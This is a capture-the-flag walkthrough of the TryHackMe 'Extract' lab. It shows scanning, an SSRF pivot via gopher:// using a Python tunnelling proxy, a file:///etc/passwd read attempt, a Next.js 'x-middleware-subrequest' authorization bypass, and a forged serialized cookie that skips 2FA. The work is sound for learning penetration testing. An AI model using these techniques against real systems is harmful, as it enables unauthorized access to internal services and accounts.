<h1 align="center">Extract</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/196261cf-f320-4b2a-a197-9a0e9c561755"><br>
2025, September 6<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>488</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Can you extract the secrets from the library?</em>.<br>
Access it <a href="https://tryhackme.com/room/extract"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/56d3544e-432a-4932-ad9c-2d810784d50e"></p>

<h2>Task 1 . Introduction</h2>
<p>The librarian rushed some final changes to the web application before heading off on holiday. In the process, they accidentally left sensitive information behind! Your challenge is to find and exploit the vulnerabilities in the application to extract these secrets.<br>

Start the VM by clicking the Start Machine button at the top right of the task. You can complete the challenge by connecting through VPN or the AttackBox, which contains all the essential tools.</p>

<p><em>Answer the questions below</em></p>

<br>
<h2>Nikto</h2>

```bash
:~/Extract# nikto -h xx.xx.xxx.xx
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xx.xxx.xx
+ Target Hostname:    ...
+ Target Port:        80
+ Start Time:         2025-09-06 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.58 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ 6544 items checked: 0 error(s) and 2 item(s) reported on remote host
+ End Time:           2025-09-06 xx:xx:xx (GMT1) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<h2>nmap</h2>

```bash
:~/Extract# nmap -sS -sV -vv -p- xx.xx.xxx.xx
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.58 ((Ubuntu))
```

```bash
:~/Extract nmap -sC -sV -Pn -p- xx.xx.xxx.xx
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: TryBookMe - Online Library
```

```bash
:~/Extract# rustscan -a xx.xx.xxx.xx --ulimit 5500 -- -A -Pn
...
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: TryBookMe - Online Library
```

<h2>dirsearch</h2>
<p>

- /javascript<br>
- /management<br>
- /pdf</p>


```bash
:~/Extract# dirsearch -u http://xx.xx.xxx.xx
...
[xx:xx:xx] 301 -  321B  - /javascript  ->  http://xx.xx.xxx.xx/javascript/
[xx:xx:xx] 301 -  321B  - /management  ->  http://xx.xx.xxx.xx/management/
...
[xx:xx:xx] 301 -  314B  - /pdf  ->  http://xx.xx.xxx.xx/pdf/
```

<p>

- /management/logout.php</p>

```bash
:~/Extract# dirsearch -u http://xx.xx.xxx.xx/management/

...
[xx:xx:xx] 302 -    0B  - /management/logout.php  ->  index.php
```

<p>

- /javascript/events</p>

```bash
:~/Extract# dirsearch -u http://xx.xx.xxx.xx/javascript/

...
[xx:xx:xx] 301 -  328B  - /javascript/events  ->  http://xx.xx.xxx.xx/javascript/events/
```

<p>

- /javascript/events/events</p>


```bash
:~/Extract# dirsearch -u http://xx.xx.xxx.xx/javascript/events/

...
[xx:xx:xx] 200 -    4KB - /javascript/events/events
```

<h2>fuff</h2>
<p>

- pdf<br>
- management<br>
- javascrupt</p>

```bash
:~# ffuf -u http://xx.xx.xxx.xx/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc all -fs 274
...
pdf                     [Status: 301, Size: 310, Words: 20, Lines: 10]
management              [Status: 301, Size: 317, Words: 20, Lines: 10]
javascript              [Status: 301, Size: 317, Words: 20, Lines: 10]
```

<h2>/javascript</h2>
<p>

- Forbidden</p>


<h2>/management</h2>
<p>

- Access Denied</p>

```bash
:~# curl -s http://xx.xx.xxx.xx/preview.php?url=http://xx.xx.xxx.xx/management/
Access denied.
```

<br>

```bash
GET /management HTTP/1.1
Host: xx.xx.xxx.xx
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

```bash
HTTP/1.1 301 Moved Permanently
Date: Sat, 06 Sep 2025 xx:xx:xx GMT
Server: Apache/2.4.58 (Ubuntu)
Location: http://xx.xx.xxx.xx/management/
Content-Length: 317
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://xx.xx.xxx.xx/management/">here</a>.</p>
<hr>
<address>Apache/2.4.58 (Ubuntu) Server at xx.xx.xxx.xx Port 80</address>
</body></html>
```

<br><br>

```bash
:~# curl -s http://xx.xx.xxx.xx/preview.php?url=http://0.0.0.0/management/

<!DOCTYPE html>
...
  <title>TryBookMe - Login</title>
 ...
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
...
      <a class="navbar-brand" href="#">\U0001f510 TryBookMe Login</a>
...
      <h3 class="text-center mb-4">Sign In</h3>
...
      <form method="POST" action="">
        <div class="mb-3">
          <label for="username" class="form-label">Username</label>
          <input type="text" name="username" class="form-control" id="username" required>
        </div>

        <div class="mb-3">
          <label for="password" class="form-label">Password</label>
          <input type="password" name="password" class="form-control" id="password" required>
        </div>
...
```

```bash
:~# curl -s http:/xx.xx.xxx.xx/preview.php?url=http://127.0.0.1/management/

<!DOCTYPE html>
...
  <title>TryBookMe - Login</title>
 ...
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
...
      <a class="navbar-brand" href="#">\U0001f510 TryBookMe Login</a>
...
      <h3 class="text-center mb-4">Sign In</h3>
...
      <form method="POST" action="">
        <div class="mb-3">
          <label for="username" class="form-label">Username</label>
          <input type="text" name="username" class="form-control" id="username" required>
        </div>

        <div class="mb-3">
          <label for="password" class="form-label">Password</label>
          <input type="password" name="password" class="form-control" id="password" required>
        </div>
...
```

<br>
<h2>Web port 80</h2>

<p>

- launched Burp Suite<br>
- enabled FoxyProxy<br>
- clicked Dummy</p>

<img width="1124" height="210" alt="image" src="https://github.com/user-attachments/assets/36494e8b-6e5c-4baa-b52d-dbbbe2d0c55c" />

<br>

<img width="1120" height="238" alt="image" src="https://github.com/user-attachments/assets/fb3421cc-9518-43d4-99da-ac089e6a076a" />

<br>

<img width="1185" height="454" alt="image" src="https://github.com/user-attachments/assets/693ab4c8-d052-4d96-9149-5fc26874994e" />

<br>
<br>

```bash
GET /preview.php?url=http%3A%2F%2Fcvssm1%2Fpdf%2Fdummy.pdf HTTP/1.1
Host: xx.xx.xxx.xx
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://xx.xx.xxx.xx/
Upgrade-Insecure-Requests: 1
Priority: u=4
```

```bash
HTTP/1.1 200 OK
Date: Sat, 06 Sep 2025 xx:xx:xx GMT
Server: Apache/2.4.58 (Ubuntu)
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/pdf
Content-Length: 13264

....
```

<br>
<br>


```bash
:~# echo "Hey" > testing.txt
:~# cat testing.txt
Hey
```

<br>
<br>

```bash
:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

<br>
<br>

```bash
GET /preview.php?url=http%3A%2F%2Fxx.xxx.xx.xx%3A80002Ftesting.txt HTTP/1.1
Host: xx.xx.xxx.xx
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://xx.xx.xxx.xx/
Upgrade-Insecure-Requests: 1
Priority: u=4


```

```bash
HTTP/1.1 200 OK
Date: Sat, 06 Sep 2025 xx:xx:xx GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/plain;charset=UTF-8


```

<br>
<br>

```bash
GET /preview.php?url=http%3A%2F%2Fxx.xxx.xx.xx%3A8000%2Ftesting.txt HTTP/1.1
Host: xx.xx.xxx.xx
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://xx.xx.xxx.xx/
Upgrade-Insecure-Requests: 1
Priority: u=4


```

```bash
HTTP/1.1 200 OK
Date: Sat, 06 Sep 2025 xx:xx:xx GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Length: 4
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/plain;charset=UTF-8

Hey

```

<br>
<br>


```bash
:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xx.xxx.xx - - [06/Sep/2025 xx:xx:xx] "GET /testing.txt HTTP/1.1" 200 -
```

<br>
<br>

```bash
GET /preview.php?url=file:///etc/passwd HTTP/1.1
Host: xx.xx.xxx.xx
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://xx.xx.xxx.xx/
Upgrade-Insecure-Requests: 1
Priority: u=4


```

```bash
HTTP/1.1 200 OK
Date: Sat, 06 Sep 2025 xx:xx:xx GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Length: 34
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

URL blocked due to keyword: file:/
```

<br>
<br>

```bash
GET /preview.php?url=gopher://xx.xxx.xx.xx:4444/_hi HTTP/1.1
Host: xx.xx.xxx.xx
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://xx.xx.xxx.xx/
Upgrade-Insecure-Requests: 1
Priority: u=4


```

```bash
HTTP/1.1 200 OK
Date: Sat, 06 Sep 2025 xx:xx:xx GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/plain;charset=UTF-8
```

<p>

- disconnected :-(</p>

```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on xx.xx.xxx.xx 37010
hi
```

<br>
<h2>Enumeration  .  Internal Ports</h2>

```bash
:~# ffuf -u 'http://xx.xx.xxx.xx/preview.php?url=http://127.0.0.1:FUZZ/' -w <(seq 1 65535) -mc all -t 100 -fs 0
...
80                      [Status: 200, Size: 1735, Words: 304, Lines: 65]
10000                   [Status: 200, Size: 6131, Words: 104, Lines: 1]
```

<h2>Next.js application</h2>

```bash
GET /preview.php?url=http://127.0.0.1:10000 HTTP/1.1
Host: 10.10.210.15
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://xx.xx.xxx.xx/
Upgrade-Insecure-Requests: 1
Priority: u=4

```

```bash
HTTP/1.1 200 OK
Date: Sat, 06 Sep 2025 xx:xx:xx GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 6131
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/178989e77b112f7f.css" crossorigin="" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-8fc0c21e0210cbd2.js" crossorigin=""/><script src="/_next/static/chunks/fd9d1056-ffbd49fae2ee76ea.js" async="" crossorigin=""></script><script src="/_next/static/chunks/472-22e55b21ed910619.js"...TryBookMe<...[\"$\",\"a\",null,{\"href\":\"/customapi\",\"style\":{\"color\":\"blue\",\"textDecoration\":\"underline\"},\"children\":\"API\"}]}]]}]}]]}],...{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark)...:\"Unauthorised access to this system is strictly prohibited.\"}]]}]}],null],\"segment\":\"__PAGE__\"},\"styles\":null}]]}]}]}],null]}]]\n"])</script>...</script></body></html>
```

<h2>Proxy A</h2>

```bash
#!/usr/bin/env python3

import socket
import requests
import urllib.parse
import threading

LHOST = '127.0.0.1'
LPORT = 5000
TARGET_HOST = "xx.xx.xxx.xx"
HOST_TO_PROXY = "127.0.0.1"
PORT_TO_PROXY = 10000

def handle_client(conn, addr):
    with conn:
        data = conn.recv(65536)
        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))
        target_url = f"http://{TARGET_HOST}/preview.php?url=gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}/_{double_encoded_data}"
        resp = requests.get(target_url)
        conn.sendall(resp.content)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((LHOST, LPORT))
    s.listen()
    print(f"Listening on {LHOST}:{LPORT}, proxying to {HOST_TO_PROXY}:{PORT_TO_PROXY} via {TARGET_HOST}...")
    while True:
        conn, addr = s.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        client_thread.start()
```

```bash
:~# python3 proxy.py
Listening on 127.0.0.1:5000, proxying to 127.0.0.1:10000 via xx.xx.xxx.xx...
```

<h2>127.0.01:5000</h2>

<img width="1201" height="466" alt="image" src="https://github.com/user-attachments/assets/4f705656-40a9-45a7-bbf1-8b26626b5c23" />

<br>

```bash
..."stylesheet" href="/_next/static/css/178989e77b112f7f.css" crossorigin="" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-8fc0c21e0210cbd2.js" crossorigin=""/><script src="/_next/static/chunks/fd9d1056-ffbd49fae2ee76ea.js"...
```

<h2>API</h2>

<p>

- GET http://127.0.0.1:5000/customapi</p>

<img width="1191" height="279" alt="image" src="https://github.com/user-attachments/assets/43e89ae3-52f2-4851-aef4-d6c1ea9ed095" />

<br>

```bash
GET /customapi HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://127.0.0.1:5000/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
```

```bash
HTTP/1.1 307 Temporary Redirect
location: http://localhost:10000/
Date: Sat, 06 Sep 2025 xx:xx:xx GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 23

http://localhost:10000/
```

<h2></h2>

<p>

- This API is currently under maintenance. Please use the library portal to add new books using librarian:***********</p>

<br>

```bash
GET /customapi HTTP/1.1
Host: 127.0.0.1:5000
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

```bash
HTTP/1.1 200 OK
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Url, Accept-Encoding
x-nextjs-cache: HIT
X-Powered-By: Next.js
Cache-Control: s-maxage=31536000, stale-while-revalidate
ETag: "h7edg8a4eb5mg"
Content-Type: text/html; charset=utf-8
Content-Length: 7288
Date: Sat, 06 Sep 2025 xx:xx:xx GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!DOCTYPE html><html lang="en"><head>..."description" content="API Service for TryBookMe"/><script src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js" crossorigin="" noModule=""></script></head><body><main style="max-width:1000px;margin:0 auto;padding:20px"><header style="margin-bottom:20px"><h1 style="font-size:24px;font-weight:bold">TryBookMe</h1><nav style="margin-top:10px"><ul style="display:flex;gap:16px"><li><a href="/" style="color:blue;text-decoration:underline">Home</a></li><li><a href="/customapi" style="color:blue;text-decoration:underline">API</a></li></ul></nav></header><div style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;background-color:#f33;color:white;padding:2rem"><h1 style="font-size:3rem;margin-bottom:2rem">Maintenance!</h1><div style="background-color:rgba(0,0,0,0.2);padding:2rem;border-radius:8px;max-width:800px;text-align:center"><p style="font-size:1.5rem;margin-bottom:1rem">This API is currently under maintenance. Please use the library portal to add new books using librarian:***********</p><p style="font-size:1.25rem">First flag is <!-- -->THM{********************************}</p>...</script></body></html>
```

<br>

```bash
GET /customapi HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://127.0.0.1:5000/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
```

<h2>Proxy B</h2>

```bash
#!/usr/bin/env python3

import socket
import requests
import urllib.parse
import threading

LHOST = '127.0.0.1'
LPORT = 5000
TARGET_HOST = "xx.xx.xxx.xx"
HOST_TO_PROXY = "127.0.0.1"
PORT_TO_PROXY = 80

def handle_client(conn, addr):
    with conn:
        data = conn.recv(65536)
        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))
        target_url = f"http://{TARGET_HOST}/preview.php?url=gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}/_{double_encoded_data}"
        resp = requests.get(target_url)
        conn.sendall(resp.content)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((LHOST, LPORT))
    s.listen()
    print(f"Listening on {LHOST}:{LPORT}, proxying to {HOST_TO_PROXY}:{PORT_TO_PROXY} via {TARGET_HOST}...")
    while True:
        conn, addr = s.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        client_thread.start()
```


```bash
:~# python3 proxy2.py
Listening on 127.0.0.1:5000, proxying to 127.0.0.1:80 via xx.xx.xxx.xx...
```

<h2>127.0.0.1:5000/management</h2>

<img width="1189" height="556" alt="image" src="https://github.com/user-attachments/assets/af6d543e-bf18-42da-abaa-0fb18a6b802d" />

<br>

<img width="1191" height="437" alt="image" src="https://github.com/user-attachments/assets/6d2ea885-fcbb-4d57-b70b-a71b5a89cfa1" />

<br><br>

```bash
POST /management/ HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://127.0.0.1:5000
Connection: keep-alive
Referer: http://127.0.0.1:5000/management/
Cookie: PHPSESSID=**************************
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

username=librarian&password=***********


```

```bash
HTTP/1.1 302 Found
Date: Sat, 06 Sep 2025 xx:xx:xx GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 xx:xx:xx GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A0%3B%7D; expires=Sat, 06 Sep 2025 xx:xx:xx GMT; Max-Age=3600; path=/
Location: 2fa.php
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

<br>

```bash
GET /management/2fa.php HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://127.0.0.1:5000/management/
Connection: keep-alive
Cookie: PHPSESSID=**************************; auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A0%3B%7D
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i


```

```bash
HTTP/1.1 200 OK
Date: Sat, 06 Sep 2025 xx:xx:xx GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 xx:xx:xx GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1361
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>TryBookMe - 2FA Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
 ...
     <a class="navbar-brand" href="#">? 2FA Verification</a>
...
    <h4 class="text-center mb-4">Enter your 2FA code</h4>
    <form method="POST">
...
        <button type="submit" class="btn btn-primary">Verify</button>
...
```

<br>

```bash
GET /management/ HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
```

```bash
HTTP/1.1 200 OK
Date: Sat, 06 Sep 2025 xx:xx:xx GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=**************************; path=/
Expires: Thu, 19 Nov 1981 xx:xx:xx GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1656
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8


<!DOCTYPE html>
...
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
...
       <a class="navbar-brand" href="#">? TryBookMe Login</a>
...
      <h3 class="text-center mb-4">Sign In</h3>
...
      <form method="POST" action="">
        <div class="mb-3">
          <label for="username" class="form-label">Username</label>
          <input type="text" name="username" class="form-control" id="username" required>
        </div>

        <div class="mb-3">
          <label for="password" class="form-label">Password</label>
          <input type="password" name="password" class="form-control" id="password" required>
        </div>
...
```

<img width="1205" height="470" alt="image" src="https://github.com/user-attachments/assets/367efafa-5dee-488a-b135-32b307f6a1a2" />

<br>
<p>Set-Cookie: auth_token=<br>
  
- O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A0%3B%7D;<br><code>O:9:"AuthToken":1:{s:9:"validated";b:0;};</code><br><br>
- O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A1%3B%7D<br><code>O:9:"AuthToken":1:{s:9:"validated";b:1;}</code><p>


```bash
GET /management/2fa.php HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://127.0.0.1:5000/management/
Connection: keep-alive
Cookie: PHPSESSID=**************************; auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A1%3B%7D
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i


```


```bash
HTTP/1.1 200 OK
Date: Sat, 06 Sep 2025 xx:xx:xx GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 xx:xx:xx GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 489
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
...
  <title>2FA Complete - TryBookMe</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
...
      <h4 class="alert-heading">Congratulations!</h4>
      <p>Here's the second flag: THM{********************************}</p>
...
```

<br>
<p>1.2. What is the second flag?<br>
<code>THM{********************************}</code></p>

<br>

<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/57e84a98-64fb-43a1-9805-9e7c3c134e10"><br>
                  <img width="800px" src="https://github.com/user-attachments/assets/85ff3f02-f2db-4b97-adb0-2b48ad78d687"></p>

<h2 align="center">My TryHackMe Journey</h2>

<div align="center">

| Date              | Room                  |Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :--------------- | :-------------------  |  :------:|:----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |                       |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, Sep 6       |Medium 🚩 - <code>Plotted-EMR</code> | 488      |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ   |    12ⁿᵈ    | 124,326  |    944    |    73     |
| 2025, Sep 5       |Medium 🚩 - Inferno | 487      |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ   |    12ⁿᵈ    | 124,236  |    943    |    73     |
| 2025, Sep 5       |Easy 🔗 - Psycho Break | 487      |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ   |    10ᵗʰ    | 124,152  |    942    |    73     |
| 2025, Sep 4       |Medium 🔗 - IP and Domain Threat Intel|486|	113ʳᵈ|	5ᵗʰ	|579ᵗʰ|	10ᵗʰ|	124,018|	940	|73|
| 2025, Sep 4       |Medium 🚩 - Cold VVars | 486      |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ   |    10ᵗʰ    | 124,048  |    941    |    73     |
| 2025, Sep 3       |Easy 🔗 - Malware Classification | 485     |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ   |    13ʳᵈ    | 123,882  |    939   |    73     |
